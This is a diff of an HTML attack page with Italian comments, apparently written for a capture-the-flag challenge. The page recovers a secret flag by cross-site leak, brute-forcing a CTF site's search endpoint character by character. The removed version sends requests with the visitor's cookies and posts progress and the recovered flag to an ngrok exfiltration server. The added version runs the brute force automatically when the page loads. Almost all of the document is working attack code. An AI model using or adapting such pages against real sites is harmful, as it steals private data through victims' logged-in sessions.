@@ -3,64 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rubare Flag</title>
-</head>
-<body>
-    <h1>Rubare la Flag dell'Architetto</h1>
+    <title>Brute Force XS Leak</title>
     <script>
-    const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
-    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
-    let currentFlag = 'flag{'; // Inizio della flag
+        async function bruteForceFlag() {
+            const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
+            const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; // Modifica se necessario
+            let currentFlag = 'flag{'; // Inizia con la parte fissa della flag
+            let found = false;
 
-    const logProgress = async (message) => {
-    await fetch('https://bcc2-87-4-142-72.ngrok-free.app/log', {
-
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: `message=${encodeURIComponent(message)}`  // Updated to use 'message'
-    });
-    };
-
-
-    const testChar = async (position) => {
-        if (position < 100) { // Limite superiore
-            for (let char of chars) {
-                const query = `${baseUrl}${currentFlag}${char}`;
-                const response = await fetch(query, {
-                    method: 'GET',
-                    credentials: 'include'
-                });
-
-                if (response.ok) {
-                    await logProgress(`Trovato carattere ${char} per la posizione ${position}`);
-                    console.log(`Trovato carattere ${char} per la posizione ${position}`);
-                    currentFlag += char; // Aggiungi carattere
-                    await testChar(currentFlag.length); // Prossima posizione
-                    return; // Esci per evitare conflitti
+            // Funzione ricorsiva per il brute force
+            async function search(index) {
+                if (found) return; // Se già trovata, esci
+                if (index === currentFlag.length) {
+                    for (let char of characters) {
+                        const url = baseUrl + currentFlag + char + '}'; // Prova aggiungendo un carattere
+                        const response = await fetch(url);
+                        if (response.status === 200) {
+                            currentFlag += char + '}'; // Aggiungi il carattere e chiudi la flag
+                            found = true; // Segna come trovata
+                            console.log('Flag trovata:', currentFlag);
+                            break; // Esci dal ciclo
+                        }
+                    }
                 } else {
-                    await logProgress(`Carattere ${char} non valido per la posizione ${position}`);
-                    console.log(`Carattere ${char} non valido per la posizione ${position}`);
+                    // Prova con il prossimo carattere
+                    for (let char of characters) {
+                        const url = baseUrl + currentFlag + char; // Prova con il carattere attuale
+                        const response = await fetch(url);
+                        if (response.status === 200) {
+                            currentFlag += char; // Aggiungi il carattere
+                            await search(index + 1); // Prosegui al prossimo carattere
+                            break; // Esci dal ciclo se trovato
+                        }
+                    }
                 }
             }
-        } else {
-            console.log(`Flag completa: ${currentFlag}`);
-            // Invia la flag al tuo server Flask
-            const response = await fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `flag=${encodeURIComponent(currentFlag)}`
-            });
-            const data = await response.text();
-            console.log(data);
-        }
-    };
 
-    // Inizia il test
-    testChar(currentFlag.length);
+            await search(0); // Inizia la ricerca
+        }
+
+        window.onload = function() {
+            bruteForceFlag(); // Avvia la funzione al caricamento della pagina
+        };
     </script>
+</head>
+<body>
+    <h1>Brute Force XS Leak Attack</h1>
+    <p>Attendere mentre si cerca la flag...</p>
 </body>
 </html>
